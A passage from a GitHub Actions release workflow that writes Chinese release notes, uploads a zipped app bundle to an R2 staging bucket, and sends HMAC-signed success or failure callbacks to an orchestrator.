            echo "打包时间:  $(date -u '+%Y-%m-%d %H:%M UTC')"
            echo "构建运行:  ${{ github.run_id }}"
            echo ""
            echo "核对方法:装好后打开 App → 设置 → 关于,那里的「#构建ID」应与上面一致。"
            echo "不一致 = 你装的不是这个包(拿到旧包/装错了)。"
          } >> "release-bundle/发布说明.txt"
          # End-user-facing macOS install guide (brand-agnostic → plain copy).
          # Operator forwards it to Mac users so the un-notarized pkg's Gatekeeper
          # prompt doesn't read as "broken".
          cp -f docs/build-farm/macos-install.txt "release-bundle/macOS安装说明.txt" 2>/dev/null || true
          ls -la release-bundle

      # Deliver via R2, NOT a GitHub artifact: each bundle is ~350MB, a free
      # account has only 500MB of shared Actions storage, and artifacts in a PUBLIC
      # repo are downloadable by anyone. The console pulls this object and proxies
      # it to the operator; the staging bucket's 1-day lifecycle cleans up.
      - name: Upload bundle to R2 (console downloads from here)
        if: success()
        shell: bash
        run: |
          set -euo pipefail
          ( cd release-bundle && zip -r -q ../release.zip . )
          aws s3 cp --endpoint-url "$R2_ENDPOINT" release.zip \
            "s3://$STAGING_BUCKET/$BUILD_ID/signed/release.zip"
          echo "→ s3://$STAGING_BUCKET/$BUILD_ID/signed/release.zip ($(du -h release.zip | cut -f1))"

      - name: Callback orchestrator — success (HMAC-signed)
        if: success()
        shell: bash
        run: |
          body="{\"build_id\":\"$BUILD_ID\",\"slug\":\"$SLUG\",\"version\":\"$VERSION\",\"status\":\"published\",\"run_id\":${{ github.run_id }}}"
          sig=$(printf '%s' "$body" | openssl dgst -sha256 -hmac "${{ secrets.CALLBACK_HMAC_SECRET }}" | awk '{print $2}')
          # Strip any stray whitespace/newline from the secret — a trailing \n in
          # ORCHESTRATOR_CALLBACK_URL makes curl reject it ("Malformed input to a
          # URL function") and, being -fsS on the success path, fails the whole
          # (already-succeeded) job.
          url=$(printf '%s' "${{ secrets.ORCHESTRATOR_CALLBACK_URL }}" | tr -d '[:space:]')
          curl -fsS -X POST "$url" \
            -H "content-type: application/json" -H "x-signature: sha256=$sig" --data "$body"

      - name: Callback orchestrator — failure
        if: failure()
        shell: bash
        run: |
          body="{\"build_id\":\"$BUILD_ID\",\"slug\":\"$SLUG\",\"version\":\"$VERSION\",\"status\":\"failed\",\"run_url\":\"${{ github.server_url }}/${{ github.repository }}/actions/runs/${{ github.run_id }}\"}"
          sig=$(printf '%s' "$body" | openssl dgst -sha256 -hmac "${{ secrets.CALLBACK_HMAC_SECRET }}" | awk '{print $2}')
          url=$(printf '%s' "${{ secrets.ORCHESTRATOR_CALLBACK_URL }}" | tr -d '[:space:]')
          curl -fsS -X POST "$url" \
            -H "content-type: application/json" -H "x-signature: sha256=$sig" --data "$body" || true
